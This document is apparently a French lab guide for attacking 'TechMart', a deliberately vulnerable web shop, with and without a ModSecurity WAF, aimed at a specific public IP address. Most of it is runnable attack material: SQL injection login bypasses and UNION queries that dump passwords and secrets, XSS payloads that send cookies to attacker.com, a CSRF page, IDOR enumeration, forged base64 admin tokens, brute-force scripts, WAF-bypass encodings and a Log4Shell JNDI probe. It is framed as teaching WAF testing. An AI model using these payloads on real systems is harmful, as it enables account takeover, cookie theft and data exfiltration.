# TechMart — Guide Complet des Attaques (A → Z)

> **Usage pédagogique uniquement.**  
> Tester sur `http://45.92.110.154:5000` (sans WAF) puis sur `http://45.92.110.154:8080` (avec WAF)  
> pour observer le comportement de ModSecurity.

---

## Prérequis

```bash
# Outils nécessaires
sudo apt install curl nmap nikto sqlmap hydra gobuster wfuzz

# Pip
pip install requests

# Vérifier que les conteneurs tournent
docker-compose ps
```

---

## PHASE 1 — RECONNAISSANCE

### 1.1 Nmap — Scan de ports

```bash
# Scan simple
nmap -sV 45.92.110.154 -p 5000,8080,3000,3100

# Scan scripts HTTP (détecté par le WAF règle 1004)
nmap -sC -sV -p 8080 45.92.110.154

# Scan agressif avec scripts web
nmap -p 8080 --script=http-headers,http-title,http-methods 45.92.110.154
```

**Résultat attendu** : ports 5000, 8080, 3000, 3100 ouverts.  
**WAF** : les requêtes nmap HTTP sont bloquées par la règle 1004 (User-Agent Nmap).

---

### 1.2 Nikto — Scan de vulnérabilités web

```bash
# Sur l'app directe (sans WAF)
nikto -h http://45.92.110.154:5000

# Sur le WAF
nikto -h http://45.92.110.154:8080
```

**Résultat** : sur port 5000, nikto scanne librement.  
**WAF** : sur port 8080, blocage règle 1001 (User-Agent nikto → HTTP 403).

```bash
# Tentative de contournement UA
nikto -h http://45.92.110.154:8080 -useragent "Mozilla/5.0"
# Peut toujours être détecté par les paths caractéristiques
```

---

### 1.3 Gobuster / Dirb — Énumération de répertoires

```bash
# Gobuster (bloqué par règle 1001 sur le WAF)
gobuster dir -u http://45.92.110.154:5000 -w /usr/share/wordlists/dirb/common.txt

# Dirb
dirb http://45.92.110.154:5000

# Routes TechMart connues à tester
curl -s -o /dev/null -w "%{http_code}" http://45.92.110.154:5000/admin
curl -s -o /dev/null -w "%{http_code}" http://45.92.110.154:5000/api/v1/products
curl -s -o /dev/null -w "%{http_code}" http://45.92.110.154:5000/.env

# Sur le WAF — plus de 20 × 404 → blocage règle 1013
for path in admin login register api wallet orders profile; do
  echo -n "$path: "
  curl -s -o /dev/null -w "%{http_code}\n" http://45.92.110.154:8080/$path
done
```

---

## PHASE 2 — INJECTION SQL (SQLi)

### 2.1 SQLi Bypass — Login

**Endpoint** : `POST /login`  
**Paramètre** : `username`  
**Requête vulnérable** : `SELECT * FROM users WHERE username='INPUT' AND password='INPUT'`

```bash
# Test Manuel — connexion sans mot de passe
curl -s -c cookies.txt -b cookies.txt \
  -X POST http://45.92.110.154:5000/login \
  -d "username=admin'--&password=whatever" \
  -L | grep -o "Admin\|Connexion\|Dashboard" | head -1

# Connexion en tant que n'importe quel utilisateur
curl -s -X POST http://45.92.110.154:5000/login \
  -d "username=' OR '1'='1'--&password=" -L -c cookies.txt

# Connexion directe en admin
curl -s -X POST http://45.92.110.154:5000/login \
  -d "username=admin'--&password=x" -L -c admin_cookies.txt

# Cibler un rôle spécifique
curl -s -X POST http://45.92.110.154:5000/login \
  -d "username=' OR role='admin'--&password=" -L -c cookies.txt
```

```bash
# Sur le WAF (devrait être bloqué)
curl -s -X POST http://45.92.110.154:8080/login \
  -d "username=admin'--&password=x" -w "\nHTTP: %{http_code}\n"
# Attendu : HTTP 403
```

**sqlmap automatisé** :
```bash
# Sans WAF
sqlmap -u "http://45.92.110.154:5000/login" \
  --data="username=test&password=test" \
  --method=POST \
  --dbms=postgresql \
  --level=3 --risk=2 \
  -p username \
  --batch

# Avec WAF (doit être bloqué dès le premier scan)
sqlmap -u "http://45.92.110.154:8080/login" \
  --data="username=test&password=test" \
  -p username --batch
# Attendu : blocage 403 ou 429 dès les premiers payloads
```

---

### 2.2 SQLi UNION — Extraction de données via /search

**Endpoint** : `GET /search?q=`  
**Requête vulnérable** :  
```sql
SELECT p.*,ca.name,ca.color FROM products p JOIN categories ca 
ON p.category_id=ca.id WHERE p.name ILIKE '%INPUT%' ...
```

**Étape 1 — Déterminer le nombre de colonnes** :
```bash
# Tester avec ORDER BY (erreur si trop de colonnes)
curl -s "http://45.92.110.154:5000/search?q=%25' ORDER BY 13--" | grep -i "error\|column"
curl -s "http://45.92.110.154:5000/search?q=%25' ORDER BY 14--" | grep -i "error"
# → 13 colonnes dans le SELECT original

# Vérification avec NULL
curl -s "http://45.92.110.154:5000/search?q=%25' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--" | grep -i "error"
```

**Étape 2 — Identifier les colonnes affichées** :
```bash
curl -s "http://45.92.110.154:5000/search?q=%25' UNION SELECT 1,'VISIBLE_NAME','VISIBLE_DESC',0,NULL,NULL,NULL,NULL,NULL,'📦',NULL,'CAT_NAME','#ff0000'--" | grep "VISIBLE"
```

**Étape 3 — Extraire les données sensibles** :
```bash
# Lire la table secret_data
curl -g "http://45.92.110.154:5000/search?q=%25' UNION SELECT 1,label,value,0,NULL,NULL,NULL,NULL,NULL,'🔓',NULL,'Secrets','#e94560' FROM secret_data--"

# Lire les mots de passe des utilisateurs
curl -g "http://45.92.110.154:5000/search?q=%25' UNION SELECT id,username,password,0,NULL,NULL,NULL,NULL,NULL,'👤',NULL,'Users','#e94560' FROM users--"

# Informations sur la base PostgreSQL
curl -g "http://45.92.110.154:5000/search?q=%25' UNION SELECT 1,table_name,table_schema,0,NULL,NULL,NULL,NULL,NULL,'🗄️',NULL,'Schema','#e94560' FROM information_schema.tables WHERE table_schema='public'--"
```

**sqlmap sur /search** :
```bash
sqlmap -u "http://45.92.110.154:5000/search?q=test" \
  --dbms=postgresql \
  --technique=U \
  --level=3 \
  --dump-all \
  --batch
```

**Test WAF** :
```bash
# Payload encodé pour tenter de bypasser
curl -g "http://45.92.110.154:8080/search?q=%25'+UNION+SELECT+1,label,value,0,NULL,NULL,NULL,NULL,NULL,'x',NULL,'x','x'+FROM+secret_data--"
# Attendu : 403 (règle 1101)
```

---

### 2.3 SQLi sur le coupon

**Endpoint** : `POST /cart/coupon`  
**Requête vulnérable** : `SELECT * FROM coupons WHERE code='INPUT' AND active=1`

```bash
# Activer le coupon désactivé ADMIN50 (-50%)
curl -s -b cookies.txt -X POST http://45.92.110.154:5000/cart/coupon \
  -d "code=PROMO10' OR '1'='1" -L | grep -i "coupon\|discount"

# Extraction via erreur SQL
curl -s -b cookies.txt -X POST http://45.92.110.154:5000/cart/coupon \
  -d "code=x'; SELECT pg_sleep(3);--"

# Boolean-based blind
curl -s -b cookies.txt -X POST http://45.92.110.154:5000/cart/coupon \
  -d "code=x' OR 1=1--"
```

---

## PHASE 3 — XSS (CROSS-SITE SCRIPTING)

### 3.1 XSS Réfléchi — /search

```bash
# Test basique
curl -s "http://45.92.110.154:5000/search?q=<script>alert(1)</script>" | grep "script"

# Steal cookie via URL externe (remplacer ATTACKER par votre IP)
# Dans un navigateur :
# http://45.92.110.154:5000/search?q=<script>fetch('http://ATTACKER:8000/?c='+document.cookie)</script>

# Avec encodage
curl -g "http://45.92.110.154:5000/search?q=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E"

# Test WAF
curl -s "http://45.92.110.154:8080/search?q=<script>alert(1)</script>" -w "\nHTTP: %{http_code}\n"
# Attendu : HTTP 403 (règle 1201)
```

---

### 3.2 XSS Stocké — Avis produits

> Se connecter d'abord : `alice` / `alice123`

```bash
# S'authentifier
curl -s -c cookies.txt -X POST http://45.92.110.154:5000/login \
  -d "username=alice&password=alice123" -L > /dev/null

# Injecter un XSS dans un avis (produit 1 = MacBook)
curl -s -b cookies.txt -X POST http://45.92.110.154:5000/product/1/review \
  -d "rating=5&title=Super produit&content=<script>document.location='http://45.92.110.154/?stolen='+document.cookie</script>"

# Vérifier que le payload est stocké
curl -s "http://45.92.110.154:5000/product/1" | grep "script"

# XSS plus discret (image)
curl -s -b cookies.txt -X POST http://45.92.110.154:5000/product/2/review \
  -d "rating=5&title=Test&content=<img src=x onerror='alert(document.cookie)'>"

# Payload qui exfiltre le cookie de tout visiteur
curl -s -b cookies.txt -X POST http://45.92.110.154:5000/product/3/review \
  -d "rating=5&title=Avis&content=<script>new Image().src='http://attacker.com/?c='+btoa(document.cookie)</script>"
```

**Test WAF** :
```bash
# Le WAF doit bloquer les payloads en POST
curl -s -b cookies.txt -X POST http://45.92.110.154:8080/product/1/review \
  -d "rating=5&title=Test&content=<script>alert(1)</script>" \
  -w "\nHTTP: %{http_code}\n"
```

---

### 3.3 XSS DOM — Profile ?tab=

```bash
# Test dans le navigateur
# http://45.92.110.154:5000/profile?tab=<img src=x onerror=alert(document.cookie)>

# Le paramètre tab est injecté via innerHTML sans sanitisation
curl -s -b cookies.txt "http://45.92.110.154:5000/profile?tab=<img+src=x+onerror=alert(1)>" | grep "tab-display"
```

---

## PHASE 4 — CSRF

### 4.1 Forcer un ajout au panier

Créer un fichier `csrf_attack.html` :

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <h1>Vous avez gagné ! Cliquez ici...</h1>
  <form action="http://45.92.110.154:5000/cart/add" method="POST" style="display:none">
    <input name="product_id" value="1">
    <input name="qty" value="99">
  </form>
</body>
</html>
```

```bash
# Servir la page malveillante
python3 -m http.server 9000
# Ouvrir dans le navigateur : http://45.92.110.154:9000/csrf_attack.html
# → Si alice est connectée à TechMart, son panier sera modifié
```

---

## PHASE 5 — IDOR

### 5.1 IDOR Web — Consultation des commandes

```bash
# Se connecter en tant que test (qui n'a pas de commandes)
curl -s -c test_cookies.txt -X POST http://45.92.110.154:5000/login \
  -d "username=test&password=test" -L > /dev/null

# Enumérer toutes les commandes (appartenant à d'autres users)
for i in $(seq 1 10); do
  echo -n "Commande $i : "
  curl -s -b test_cookies.txt "http://45.92.110.154:5000/orders/$i" | grep -o "username.*alice\|username.*bob\|Commande introuvable" | head -1
done

# WAF — détection après 30 tentatives (règle 1402)
for i in $(seq 1 35); do
  curl -s -b test_cookies.txt "http://45.92.110.154:8080/orders/$i" -o /dev/null -w "$i "
done
# Attendu : les dernières requêtes retournent 403/429
```

---

### 5.2 IDOR API — Extraction via Bearer Token

```bash
# Étape 1 : obtenir un token
TOKEN=$(curl -s -X POST http://45.92.110.154:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"

# Décoder le token (base64)
echo $TOKEN | base64 -d
# → 5:user

# Étape 2 : IDOR — lire les commandes d'autres users
for i in $(seq 1 4); do
  echo "=== Commande $i ===" 
  curl -s "http://45.92.110.154:5000/api/v1/orders/$i" \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
done

# Étape 3 : Forger un token admin
ADMIN_TOKEN=$(echo -n "1:admin" | base64)
echo "Token admin forgé : $ADMIN_TOKEN"

# Utiliser le token admin forgé
curl -s "http://45.92.110.154:5000/api/v1/orders" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool
```

---

### 5.3 SQLi dans l'API

```bash
TOKEN=$(curl -s -X POST http://45.92.110.154:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# SQLi UNION dans /api/v1/products/search
curl -g "http://45.92.110.154:5000/api/v1/products/search?q=%25' UNION SELECT 1,label,value,0,'x' FROM secret_data--"

# Extraire les users
curl -g "http://45.92.110.154:5000/api/v1/products/search?q=%25' UNION SELECT id,username,password,0,'x' FROM users--"

# SQLi dans /api/v1/auth/login
curl -s -X POST http://45.92.110.154:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"x"}'
```

---

## PHASE 6 — BRUTE FORCE

### 6.1 Hydra — Brute force login Web

```bash
# Générer un petit wordlist
echo -e "test\npassword\n123456\nadmin\nletmein\nqwerty\ntest123" > passwords.txt

# Hydra sur /login (compte test)
hydra -l test -P passwords.txt 45.92.110.154 -s 5000 http-post-form \
  "/login:username=^USER^&password=^PASS^:Identifiants incorrects" \
  -t 4 -V

# Sans WAF → trouver test:test rapidement
# Sur le WAF → blocage après 15 tentatives (règle 1502), 5 sur test (règle 1503/1504)
hydra -l test -P /usr/share/wordlists/rockyou.txt 45.92.110.154 -s 8080 http-post-form \
  "/login:username=^USER^&password=^PASS^:Identifiants incorrects" \
  -t 4
```

### 6.2 Wfuzz — Brute force login

```bash
# Wfuzz avec wordlist
wfuzz -c -z file,passwords.txt \
  -d "username=test&password=FUZZ" \
  --hh 0 \
  http://45.92.110.154:5000/login

# Sur le WAF
wfuzz -c -z file,passwords.txt \
  -d "username=test&password=FUZZ" \
  http://45.92.110.154:8080/login
# Blocage 403 dès le début (User-Agent wfuzz)
```

### 6.3 Script Python — Brute force API

```python
#!/usr/bin/env python3
# brute_api.py
import requests, base64

TARGET = "http://45.92.110.154:5000"  # ou 8080 pour tester le WAF
WORDLIST = ["test","password","123456","admin","letmein","pass","secret","test123"]

print("[*] Brute force API /api/v1/auth/login")
for pwd in WORDLIST:
    r = requests.post(f"{TARGET}/api/v1/auth/login",
                      json={"username": "test", "password": pwd},
                      timeout=3)
    status = "✅ TROUVÉ" if r.status_code == 200 else f"❌ {r.status_code}"
    print(f"  test:{pwd} → {status}")
    if r.status_code == 200:
        data = r.json()
        token = data.get("token","")
        decoded = base64.b64decode(token).decode()
        print(f"  Token: {token} → décodé: {decoded}")
        break
```

```bash
python3 brute_api.py
```

---

## PHASE 7 — AUTHENTIFICATION API FAIBLE

### 7.1 Décoder et forger le token

```bash
# Obtenir un token légitime
RESP=$(curl -s -X POST http://45.92.110.154:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}')

TOKEN=$(echo $RESP | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"

# Décoder
echo $TOKEN | base64 -d     # → 2:user

# Forger token admin (user_id=1, role=admin)
ADMIN_TOKEN=$(printf "1:admin" | base64)
echo "Token admin forgé: $ADMIN_TOKEN"

# Tester le token forgé
curl -s http://45.92.110.154:5000/api/v1/orders \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool

# Accéder au portefeuille admin
curl -s http://45.92.110.154:5000/api/v1/wallet/balance \
  -H "Authorization: Bearer $ADMIN_TOKEN"

# Forger alice (id=2)
ALICE_TOKEN=$(printf "2:user" | base64)
curl -s http://45.92.110.154:5000/api/v1/wallet/balance \
  -H "Authorization: Bearer $ALICE_TOKEN"
```

---

## PHASE 8 — ESCALADE DE PRIVILÈGES

### 8.1 Accès admin après SQLi

```bash
# 1. Bypass login SQLi
curl -s -c admin_cookies.txt -X POST http://45.92.110.154:5000/login \
  -d "username=admin'--&password=x" -L -o /dev/null

# 2. Accéder au panel admin
curl -s -b admin_cookies.txt http://45.92.110.154:5000/admin | grep -o "stats-grid\|Dashboard"

# 3. Voir tous les mots de passe en clair
curl -s -b admin_cookies.txt http://45.92.110.154:5000/admin/users | grep -o "code.*alice\|code.*bob\|code.*test" | head -5

# 4. Voir toutes les commandes
curl -s -b admin_cookies.txt http://45.92.110.154:5000/admin/orders

# 5. Modifier le statut d'une commande
curl -s -b admin_cookies.txt -X POST http://45.92.110.154:5000/admin/order/1/status \
  -d "status=cancelled"
```

---

## PHASE 9 — VÉRIFICATION WAF

### 9.1 Tester les règles une par une

```bash
BASE="http://45.92.110.154:8080"

echo "=== Test Scanner UA ===" 
curl -s "$BASE/" -A "sqlmap/1.7" -w "HTTP: %{http_code}\n" -o /dev/null
curl -s "$BASE/" -A "nikto" -w "HTTP: %{http_code}\n" -o /dev/null

echo "=== Test SQLi ===" 
curl -s "$BASE/search?q='+UNION+SELECT+1,2,3--" -w "HTTP: %{http_code}\n" -o /dev/null

echo "=== Test XSS ===" 
curl -s "$BASE/search?q=<script>alert(1)</script>" -w "HTTP: %{http_code}\n" -o /dev/null

echo "=== Test Path Traversal ===" 
curl -s "$BASE/../etc/passwd" -w "HTTP: %{http_code}\n" -o /dev/null

echo "=== Test Log4Shell ===" 
curl -s "$BASE/" -H "X-Api: \${jndi:ldap://attacker.com/a}" -w "HTTP: %{http_code}\n" -o /dev/null

echo "=== Test Rate Limit (login) ===" 
for i in $(seq 1 20); do
  curl -s -X POST "$BASE/login" -d "username=test&password=wrong$i" -o /dev/null -w "$i "
done
echo ""
```

### 9.2 Lire les logs WAF

```bash
# Logs bruts ModSecurity
docker exec central_waf tail -f /var/log/nginx/modsec_audit.log | python3 -m json.tool

# Logs d'accès nginx
docker exec central_waf tail -f /var/log/nginx/waf_access.log

# Via Grafana (http://45.92.110.154:3000)
# → Explore → Loki → {job="waf"}
# → Filtrer : {job="waf"} |= "403"
# → Filtrer : {job="waf"} |= "SQLi"
```

---

## PHASE 10 — POST-EXPLOITATION

### 10.1 Extraire le FLAG via SQLi

```bash
# Le FLAG est dans la table secret_data
curl -g "http://45.92.110.154:5000/search?q=%25' UNION SELECT 1,label,value,0,NULL,NULL,NULL,NULL,NULL,'🏆',NULL,'FLAG','#e94560' FROM secret_data WHERE label='FLAG'--" | grep "FLAG{"
```

### 10.2 Extraire tous les secrets

```bash
curl -g "http://45.92.110.154:5000/search?q=%25' UNION SELECT id::text,label,value,0,NULL,NULL,NULL,NULL,NULL,'🔓',NULL,'Secrets','#e94560' FROM secret_data--"
```

### 10.3 Créer un compte admin via SQLi

```bash
# Via injection dans le coupon (error-based stacked queries si supporté)
# PostgreSQL ne supporte pas les stacked queries via PDO par défaut
# Mais via sqlmap avec --technique=E :
sqlmap -u "http://45.92.110.154:5000/search?q=test" \
  --dbms=postgresql \
  --technique=U \
  --sql-query="SELECT username,password FROM users WHERE role='admin'" \
  --batch
```

---

## Comparatif Sans WAF / Avec WAF

| Attaque | Port 5000 (sans WAF) | Port 8080 (DetectionOnly) | Port 8080 (On) |
|---|---|---|---|
| sqlmap scan | ✅ Fonctionne | ⚠️ Log uniquement | ❌ Bloqué dès le 1er payload |
| nikto | ✅ Fonctionne | ⚠️ Log uniquement | ❌ Bloqué (UA rule 1001) |
| SQLi login | ✅ Bypass réussi | ⚠️ Log uniquement | ❌ Bloqué (rule 1102) |
| SQLi UNION | ✅ Données extraites | ⚠️ Log uniquement | ❌ Bloqué (rule 1101) |
| XSS réfléchi | ✅ Exécuté | ⚠️ Log uniquement | ❌ Bloqué (rule 1201) |
| XSS stocké | ✅ Persistant | ⚠️ Log uniquement | ❌ Bloqué (rule 1201) |
| Brute force | ✅ Réussit | ⚠️ Log uniquement | ❌ Bloqué après 15 tentatives |
| Brute force `test` | ✅ Réussit | ⚠️ Log uniquement | ❌ Bloqué après 5 tentatives |
| IDOR enum | ✅ Fonctionne | ⚠️ Log uniquement | ❌ Bloqué après 30 req |
| IDOR API | ✅ Fonctionne | ⚠️ Log uniquement | ❌ Bloqué après 20 req |
| Path traversal | ✅ Tente | ⚠️ Log uniquement | ❌ Bloqué (rule 1801) |
| Log4Shell | ✅ Tente | ⚠️ Log uniquement | ❌ Bloqué (rule 1701) |

---

## Bypass WAF (Exercice avancé)

### Tenter de bypasser les règles SQLi

```bash
# Encodage double URL
curl -g "http://45.92.110.154:8080/search?q=%2527%2520UNION%2520SELECT%2520..."

# Case mixing
curl -g "http://45.92.110.154:8080/search?q=%25' uNiOn SeLeCt 1,2,3--"

# Commentaires inline
curl -g "http://45.92.110.154:8080/search?q=%25'/**/UNION/**/SELECT/**/1,2,3--"

# Via JSON API (si l'inspection du body est désactivée)
curl -s -X POST http://45.92.110.154:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"x"}'
```

---

## Architecture réseau Docker

```
Attaquant
    │
    ├─ :5000 ──→ techmart_app (Flask direct, sans WAF)
    │
    └─ :8080 ──→ central_waf (Nginx + ModSecurity)
                      │
                      └─ proxy ──→ techmart_app:5000
                      │
                      └─ logs ──→ /var/log/nginx/modsec_audit.log
                                        │
                                    promtail ──→ loki :3100 ──→ grafana :3000
```
